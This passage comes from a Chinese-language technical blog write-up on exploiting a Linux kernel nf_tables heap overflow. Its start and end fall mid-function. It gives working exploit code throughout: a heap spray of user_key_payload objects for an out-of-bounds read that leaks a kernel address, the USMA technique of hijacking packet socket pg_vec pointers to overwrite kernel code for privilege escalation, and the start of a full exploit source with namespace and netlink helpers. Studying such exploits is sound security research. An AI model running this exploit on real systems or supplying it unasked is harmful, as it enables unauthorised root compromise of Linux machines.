</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, <span style=color:#40a070>0</span>, second_element_size <span style=color:#666>-</span> <span style=color:#40a070>4</span>);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_KEY, <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_binary_attr</span>(attr, NFTA_DATA_VALUE, (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)zerobuf, set_keylen);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_DATA,
</span></span><span style=display:flex><span>                         U32_NLA_SIZE <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
</span></span><span style=display:flex><span>  <span style=color:#06287e>set_u32_attr</span>(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_base <span style=color:#666>=</span> nlh_batch_begin;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_len <span style=color:#666>=</span> nlh_batch_begin<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_base <span style=color:#666>=</span> nlh_payload;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_len <span style=color:#666>=</span> nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_base <span style=color:#666>=</span> nlh_batch_end;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_len <span style=color:#666>=</span> nlh_batch_end<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  msg.msg_name <span style=color:#666>=</span> <span style=color:#666>&amp;</span>dest_nl;
</span></span><span style=display:flex><span>  msg.msg_namelen <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl);
</span></span><span style=display:flex><span>  msg.msg_iov <span style=color:#666>=</span> iov;
</span></span><span style=display:flex><span>  msg.msg_iovlen <span style=color:#666>=</span> <span style=color:#40a070>3</span>;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> nbytes;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ((nbytes <span style=color:#666>=</span> <span style=color:#06287e>sendmsg</span>(nlsock, <span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>)) <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] sendmsg(create set)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>close</span>(nlsock);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] %d bytes sent</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, nbytes);
</span></span><span style=display:flex><span>  <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;    sendmsg&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_begin);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_payload);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_end);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=leak><span class=section-num>5.5</span> leak</h3><p>由于 <code>msg_msg</code> 结构体使用 <code>GFP_KERNEL_ACCOUNT</code> 在 v5.14 之后通过 <code>kmalloc-cg</code> 分配，所以无法使用这个结构体对高于该版本的内核实现利用（虽然我用的是 v5.11.14）。不过对于 kmalloc-64 还可以通过 <code>user_key_payload</code> 结构体实现 leak 。<a href=https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x0A-%E5%86%85%E6%A0%B8%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D>这里</a>有对他的详细分析（这里不写了，篇幅过长）结构体定义如下：</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> user_key_payload {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> rcu_head	rcu;		<span style=color:#60a0b0;font-style:italic>/* RCU destructor */</span>
</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>short</span>	datalen;	<span style=color:#60a0b0;font-style:italic>/* length of this data */</span>
</span></span><span style=display:flex><span>        <span style=color:#902000>char</span>		data[] <span style=color:#06287e>__aligned</span>(<span style=color:#06287e>__alignof__</span>(u64)); <span style=color:#60a0b0;font-style:italic>/* actual data */</span>
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>只要控制其中的 datalen 字段就可以实现越界读。我们的做法就是喷射一些 <code>user_key_payload</code> ，然后隔着 free 掉几个，最后让 <code>elem</code> 占位，溢出 16 + 2 个字节即可控制。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>key_serial_t</span> <span style=color:#666>*</span>fenshui_key <span style=color:#666>=</span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>spray_keyring</span>(N_SPRAY_KEYRING);  <span style=color:#60a0b0;font-style:italic>// simple heap fenshui: fill holes
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#902000>key_serial_t</span> <span style=color:#666>*</span>keyrings <span style=color:#666>=</span> <span style=color:#06287e>spray_keyring</span>(N_SPRAY_KEYRING);  <span style=color:#60a0b0;font-style:italic>// spray kmalloc-64
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>10</span>; i <span style=color:#666>&lt;</span> N_SPRAY_KEYRING; i <span style=color:#666>+=</span> <span style=color:#40a070>10</span>) {
</span></span><span style=display:flex><span>  <span style=color:#06287e>key_unlink</span>(keyrings[i]);
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>leak_payload, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(leak_payload));
</span></span><span style=display:flex><span>leak_payload.len <span style=color:#666>=</span> USHRT_MAX <span style=color:#666>-</span> <span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> oob_idx <span style=color:#666>=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span><span style=color:#902000>int</span> ntry <span style=color:#666>=</span> <span style=color:#40a070>10</span>;
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> (<span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>  <span style=color:#06287e>add_elem_to_nft_set</span>(nlsock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLENAME,
</span></span><span style=display:flex><span>                      <span style=color:#40a070>1337</span>, <span style=color:#007020;font-weight:700>sizeof</span>(leak_payload), (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>leak_payload);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_KEYRING; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>memset</span>(buf, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(buf));
</span></span><span style=display:flex><span>    nbytes <span style=color:#666>=</span> <span style=color:#06287e>key_read</span>(keyrings[i], buf, <span style=color:#007020;font-weight:700>sizeof</span>(buf));
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (nbytes <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>continue</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (nbytes <span style=color:#666>==</span> USHRT_MAX <span style=color:#666>-</span> <span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>      <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[+] oob read!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>      oob_idx <span style=color:#666>=</span> i;
</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (oob_idx <span style=color:#666>!=</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>) {
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (ntry) {
</span></span><span style=display:flex><span>    ntry<span style=color:#666>--</span>;
</span></span><span style=display:flex><span>  } <span style=color:#007020;font-weight:700>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] failed to do oob read</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span> }
</span></span></code></pre></div><p>需要注意的是 key 的申请数量有上限，可以通过 <code>sysctl kernel.keys.maxkeys</code> 获得（ubuntu 22.04 默认为 200）。由于我们喷的数量偏小，所以需要多次尝试占位，知道修改 <code>datalen</code> 成功为止。</p><p>可以越界读了之后我们通过 <code>KEYCTL_REVOKE</code> 来释放 <code>user_key_payload</code> 。由于 <code>user_key_payload</code> 是 rcu 的，有 <code>struct rcu_head rcu</code> 字段存在，所以我们也可以通过它来实现 leak</p><p><a id=code-snippet--user-revoke></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>user_revoke</span>(<span style=color:#007020;font-weight:700>struct</span> key <span style=color:#666>*</span>key)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> user_key_payload <span style=color:#666>*</span>upayload <span style=color:#666>=</span> <span style=color:#06287e>user_key_payload_locked</span>(key);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* clear the quota */</span>
</span></span><span style=display:flex><span>        <span style=color:#06287e>key_payload_reserve</span>(key, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (upayload) {
</span></span><span style=display:flex><span>                <span style=color:#06287e>rcu_assign_keypointer</span>(key, <span style=color:#007020>NULL</span>);
</span></span><span style=display:flex><span>                <span style=color:#06287e>call_rcu</span>(<span style=color:#666>&amp;</span>upayload<span style=color:#666>-&gt;</span>rcu, user_free_payload_rcu);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>可见这里会通过 <code>call_rcu</code> 来删除一个 payload 。在 <code>call_rcu</code> 中会把 <code>user_free_payload_rcu</code> 写到 <code>head->func</code> 中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#902000>void</span>
</span></span><span style=display:flex><span><span style=color:#06287e>__call_rcu</span>(<span style=color:#007020;font-weight:700>struct</span> rcu_head <span style=color:#666>*</span>head, <span style=color:#902000>rcu_callback_t</span> func)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  head<span style=color:#666>-&gt;</span>func <span style=color:#666>=</span> func;
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// ...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>}
</span></span></code></pre></div><p>所以能越界读之后我们 revoke 掉所有其他的 key 然后再 read 一次，就能把 <code>user_free_payload_rcu</code> 读出来实现 leak 。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> N_SPRAY_KEYRING; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (i <span style=color:#666>!=</span> oob_idx) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>key_revoke</span>(keyrings[i]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span> }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#06287e>key_read</span>(keyrings[oob_idx], buf, <span style=color:#007020;font-weight:700>sizeof</span>(buf));
</span></span><span style=display:flex><span><span style=color:#902000>uint64_t</span> user_free_payload_rcu_addr <span style=color:#666>=</span> <span style=color:#666>*</span>(<span style=color:#902000>uint64_t</span> <span style=color:#666>*</span>)((<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)buf <span style=color:#666>+</span> <span style=color:#40a070>0x30</span>);
</span></span><span style=display:flex><span><span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;user_free_payload_rcu: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, user_free_payload_rcu_addr);
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> (user_free_payload_rcu_addr <span style=color:#666>&lt;</span> <span style=color:#40a070>0xffffffff81000000</span>) {
</span></span><span style=display:flex><span>  <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] failed to leak, read 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,
</span></span><span style=display:flex><span>          user_free_payload_rcu_addr);
</span></span><span style=display:flex><span>  <span style=color:#06287e>exit</span>(<span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span> }
</span></span></code></pre></div><h3 id=usma><span class=section-num>5.6</span> USMA</h3><p>尝试使用 360 提出的 <a href=https://vul.360.net/archives/391>USMA</a> 方法进行进一步利用，发现很好用的样子。感觉简直有点像 pipe primitive 这样的利用方式——不需要 hard code 偏移，而且可以绕过主流安全保护。简单的来说，就是 packet socket 这种 socket 支持创建内核共享环形缓冲区，这个缓冲区中的页可以通过 <code>packet_mmap</code> 直接映射到用户态用于加速数据的传输——不需要切换特权级了。而环形缓冲区中的所有页由一个 <code>pgv[]</code> 数组维护，如下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> pgv {
</span></span><span style=display:flex><span>        <span style=color:#902000>char</span> <span style=color:#666>*</span>buffer;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> packet_ring_buffer {
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> pgv		<span style=color:#666>*</span>pg_vec;
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// ...
</span></span></span></code></pre></div><p>我们可以控制申请的页数来让 <code>pg_vec</code> 占位到 kmalloc-64 中（即 5-8 页），然后通过堆溢出直接改写数组中的 buffer 指向的内核虚拟地址，这样在 <code>packet_mmap</code> 之后就可以直接改写内核页的数据，执行 shellcode 提权。</p><p>这里我们的利用方法还是堆喷一些 <code>pg_vec</code> 然后隔空释放几个。尝试占位到空洞中然后改写 <code>pg_vec</code> 指向的内存页，为了不需要硬编码偏移，我们可以直接把它指向 leak 出来的 <code>user_free_payload_rcu</code> 函数所在的几个内存页，之后直接把该函数改写成我们的 shellcode ，再通过一次 <code>user_revoke</code> 触发即可。</p><p>当然也可以按文章说的，改写 setuid ，这样会更方便（不需要自己构造一套 shellcode 了）。</p><p>效果大致如下</p><figure><img src=https://raw.githubusercontent.com/chujDK/ImageHost/main/PicGoIMage/202303081845591-usma-nop.png></figure><h2 id=exp><span class=section-num>6</span> exp</h2><p>简单的 demo ，可以改写 <code>user_free_payload_rcu</code> 函数头为 0xCC 。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020>#define _GNU_SOURCE
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sched.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;errno.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;limits.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/socket.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/types.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/syscall.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/mman.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;keyutils.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;netinet/in.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;arpa/inet.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/if_packet.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;net/if.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;net/ethernet.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;libmnl/libmnl.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/netlink.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/netfilter.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/netfilter/nf_tables.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/netfilter/nfnetlink.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/netfilter/nfnetlink_queue.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#007020>#define PAGE_SIZE 0x1000
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>write_file</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>filename, <span style=color:#902000>char</span> <span style=color:#666>*</span>text) {
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> fd <span style=color:#666>=</span> <span style=color:#06287e>open</span>(filename, O_RDWR);
</span></span><span style=display:flex><span>  <span style=color:#06287e>write</span>(fd, text, <span style=color:#06287e>strlen</span>(text));
</span></span><span style=display:flex><span>  <span style=color:#06287e>close</span>(fd);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>new_ns</span>(<span style=color:#902000>void</span>) {
</span></span><span style=display:flex><span>  <span style=color:#902000>uid_t</span> uid <span style=color:#666>=</span> <span style=color:#06287e>getuid</span>();
</span></span><span style=display:flex><span>  <span style=color:#902000>gid_t</span> gid <span style=color:#666>=</span> <span style=color:#06287e>getgid</span>();
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> buffer[<span style=color:#40a070>0x100</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>unshare</span>(CLONE_NEWUSER <span style=color:#666>|</span> CLONE_NEWNS)) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;unshare(CLONE_NEWUSER | CLONE_NEWNS)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>unshare</span>(CLONE_NEWNET)) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;unshare(CLONE_NEWNET)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>write_file</span>(<span style=color:#4070a0>&#34;/proc/self/setgroups&#34;</span>, <span style=color:#4070a0>&#34;deny&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>snprintf</span>(buffer, <span style=color:#007020;font-weight:700>sizeof</span>(buffer), <span style=color:#4070a0>&#34;0 %d 1&#34;</span>, uid);
</span></span><span style=display:flex><span>  <span style=color:#06287e>write_file</span>(<span style=color:#4070a0>&#34;/proc/self/uid_map&#34;</span>, buffer);
</span></span><span style=display:flex><span>  <span style=color:#06287e>snprintf</span>(buffer, <span style=color:#007020;font-weight:700>sizeof</span>(buffer), <span style=color:#4070a0>&#34;0 %d 1&#34;</span>, gid);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>write_file</span>(<span style=color:#4070a0>&#34;/proc/self/gid_map&#34;</span>, buffer);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// netlink helper
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span><span style=color:#06287e>make_bacth_begin_nlmsghdr</span>() {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh <span style=color:#666>=</span>
</span></span><span style=display:flex><span>      (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(<span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (nlh <span style=color:#666>==</span> <span style=color:#007020>NULL</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] malloc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>nfgm <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_DATA</span>(nlh);
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh, <span style=color:#40a070>0</span>, <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg));
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> NFNL_MSG_BATCH_BEGIN;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nfgm<span style=color:#666>-&gt;</span>res_id <span style=color:#666>=</span> NFNL_SUBSYS_NFTABLES;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> nlh;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span><span style=color:#06287e>make_bacth_end_nlmsghdr</span>() {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>nlh <span style=color:#666>=</span>
</span></span><span style=display:flex><span>      (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(<span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (nlh <span style=color:#666>==</span> <span style=color:#007020>NULL</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] malloc</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh, <span style=color:#40a070>0</span>, <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> NLM_F_REQUEST;
</span></span><span style=display:flex><span>  nlh<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
